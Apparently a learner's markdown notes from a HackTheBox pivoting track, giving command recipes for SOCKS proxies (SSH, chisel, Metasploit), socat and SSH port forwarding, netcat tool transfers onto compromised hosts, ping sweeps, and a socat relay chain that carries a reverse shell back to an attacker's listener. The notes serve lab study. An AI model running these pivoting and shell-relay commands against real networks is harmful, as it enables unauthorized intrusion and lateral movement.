# Notes on Pivoting

Notes I've taken while doing the [Containers & Pivoting Track](https://app.hackthebox.com/tracks/Containers-and-Pivoting) on HackTheBox.

---

## Important Tools

- **[Static Nmap](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/nmap)**
    - used for enumerating hosts our maachine cannot access
    - its faster than scanning through a Socks Proxy
 
- **[Static Socat](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat)**
    - lets us forward ports
    - lets us catch incoming shells

- **[Chisel](https://github.com/jpillora/chisel/releases)**
    - lets us create a client for our Socks Proxies

- **[FoxyProxy](https://addons.mozilla.org/en-CA/firefox/addon/foxyproxy-standard/)**
    - Most people already use this; I didnt
    - used to swap between different proxies
    - handy when we have multiple socks proxies to juggle

---

## Socks Proxies

Socks *(Socket Secure)* is a network protocol that allows communication to a server *through* a firewall, by routing network traffic to the server, the bahalf of the client. It can route *any* type of traffic, regardless of prolocol. We use ``proxychains`` on linux to route commands through this chain, but we must create the socks connection first.

**Use Cases:**

If we find a vulnerable service that is inaccessable to our local machine, and we cannot exploit from a comprimised machine for lack of tools, we create a socks proxy from our local machine to the comprimised one, so we can run our exploit from the local one and have it reach the vulnerable, previously inaccessable one.

Using a socks proxy to explore an inaccessable subnet, from the confort of our own machine. Not *really* useful since there will be better ways to do that, but fun nevertheless.

Common Methods of achiveing connection:
Where ``<PORT>`` is the port we want our proxy to listen on:

**SSH**

```bash
ssh -D <PORT> user@host

# Example:

ssh -D 1080 kaneki@ghoul.htb -i loot/kaneki-id_rsa
```
**Chisel**

If you have a shell on a host, but no ssh access, but can access your own (or a comprimised) machine, you can use Chisel

```bash
# On our controlled machine:

chisel server -p <PORT> --reverse

# On target machine:
# Where <IP> is the IP of our controlled machine

chisel client <IP>:<PORT> R:socks
```
```bash
# Example:
# create socks proxy on port 1080 of local machine, to give tunneling access into 10.10.10.2:

tobeatelite@10.10.10.1 $ chisel server -p 1080 --reverse        # Local machine
user1@10.10.10.2 $ ./tmp/chisel client 10.10.10.1:1080 R:socks  # Machine to tunnel

```

**Meterpreter / Metasploit**

If you have a meterpreter shell, you can set up an autoroute to the subnets you want, and then can use an auxilary module to create a socks proxy.

```bash
meterpreter > run autoroute -s 172.90.0.0/16 # I want access to this subnet
meterpreter > background

msf6 > use auxiliary/server/socks_proxy
msf6 > set srvport <PORT>
msf6 > run
```

**Using Proxychains**

Simply use the ``proxychains`` command after establishing a socks proxy. You must provide a config file, otherwise it will default to ``/etc/proxychains.conf``.

This is an example config, to route all network traffic entering through a socks proxy on our local port 1083

```
[ProxyList]
socks5 127.0.0.1 1083   
```

```bash
# Examples

# Using Custom Config
proxychains -q -f config_1083.conf nmap -F 172.19.0.2

# Using Default Config
proxychains -q python3 exploit.py 172.19.0.3 8000
```

---

## Port Forwarding

**Socat**

Local Forwarding

```bash
./socat tcp-listen:<LOCAL_PORT>,fork tcp:<REMOTE_HOST>:<REMOTE_PORT> &

# Example:
# Forward Traffic from 127.0.0.1:1234 to 10.10.14.25:9876
./socat tcp-listen:1234,fork tcp:10.10.14.25:9876 &
```

**Meterpreter / Metasploit**

Local Forwarding
```bash
meterpreter > portfwd add -l <LOCAL_PORT> -r <REMOTE_HOST> -p <REMOTE_PORT>

# Example: 
# Forward Traffic from 127.0.0.1:9009 to 10.10.14.25:8008

meterpreter > portfwd add -l 9009 -r 10.10.14.25 -p 8008
```

**SSH**

Local Forwarding

With SSH, its nice to use SSH Control Sequences to do multiple forwards, in comparision to haveing multiple Connections open with 1 forward each. To access it, hit ``Enter``, and then type ``~C``. Then you can forward ports.

```bash
# After entering the SSH prompt via instructions above:

ssh > -L <LOCAL_PORT>:<REMOTE_HOST>:<REMOTE_PORT>

# Example:
# Forward Traffic from 127.0.0.1:8008 to 10.10.14.25:80

ssh > -L 8080:10.10.14.25:80
```

I think using socks proxies is better than forwarding ports one by one, but its a case-by-case basis I guess. More details in the *Scenarios* Section

---

## Listeners

Listening for reverse shells or anything like that. Once you're a few hops inside a network, ``nc`` may not be available to catch shells, and you may want to / have to listen for connections on a comprimised machine. Socat has us covered

**Socat**

```bash
./socat tcp-listen:<PORT> stdout

# Example:
# Listen for reverse shell on port 2956

./socat tcp-listen:2956 stdout
```

---

## File Transfers

We need to get our tools onto our targets: executables, scripts, etc. Start by Looking for somthing to connect to our web server with; python, perl, wget, curl, etc. Any one will do.

**Netcat**

```bash
# Serve and Recive files using 
nc -lnvp <PORT> < <FILE>  
nc <TARGET_IP> <TARGET_PORT> > <FILE>
```
```bash
# Example:
# Transfer deepce.sh from 10.10.10.1 to 10.10.10.2

tobeatelite@10.10.10.1 $ nc -lnvp 9080 < ~/tools/deepce.sh 
user1@10.10.10.2 $ ./tmp/nc 10.10.10.1 9080 > deepce.sh  
```

**Meterpreter / Metasploit**

```bash
meterpreter > upload <FILE> <REMOTE_PATH>

# Example:
# Upload deepce.sh to /tmp/tobeatelite/deepce.sh

meterpreter > upload ~/tools/deepce.sh /tmp/tobeatelite/
```

---

## Methodologies

Things to do once you've gained a shell inside a host, with intent to pivot forward.

- View network interfaces:
    - Any new subnets available to you? Take note if so.
    - If you dont have a command to find them, try reading ``/proc/net/arp``.
    
- Discover new hosts:
    - Run a ping sweep on new subnets.
    - ``for i in $(seq 1 254); do (ping -c 1 X.X.X.$i | grep "bytes from" | cut -d':' -f1 | cut -d' ' -f4 &); done``
    - nmap works aswell: ``./nmap -sP X.X.X.X/16``.
    - Use nmap to see if you can access any new services on previous hosts from the "inside" of the network.
  
- Enumerate new hosts:
    - Use nmap via upload, or establish a socks proxy to the host.
    - nmap will run faster if its uploaded, socks proxy will slow it down.
   
- Enumerate current host with the usual techniques.

- Think Better.

---

## Scenarios

The multiple IP's in the image represent different network interfaces.

**Scenario 1: Get Access to Service 2 Hosts Away**

**Scenario 2: Receive Revshell through 2 Hosts**
<details>
    <summary>Visual</summary>
    <img src="https://github.com/ToBeatELIT3/InfoSecNotes/blob/main/Methodology/Images/fig1.png">
</details>

In this case, we have RCE on ``172.14.0.5`` and want a reverse shell. It's probobly not a good idea to recive the reverse shell on our connections with ``172.12.0.2`` or ``172.14.0.3``, because those would probobly also be reverse shells and we want to keep that connection open for us. What we do is simply use socat on the comprimised hosts to tunnel all traffic from a port, back to a netcat listener on ``10.10.0.25``.

```bash
user@172.14.0.3 $ ./tmp/socat tcp-listen:1234,fork tcp:172.0.12.2:1234 &
---
user@172.12.0.2 $ ./tmp/socat tcp-listen:1234,fork tcp:10.10.0.25:1234 &
---
tobeatelite@10.10.0.25 $ rlwrap -cAr nc -lnvp 1234
```

The tunnel is set up, and by using our RCE, we can send a reverse shell to ``172.14.0.3:1234``, have it tunnel to ``172.0.12.2:1234``, which will tunnel to ``10.10.0.25:1234``, and we will have a shell on our machine. Super simple principle.
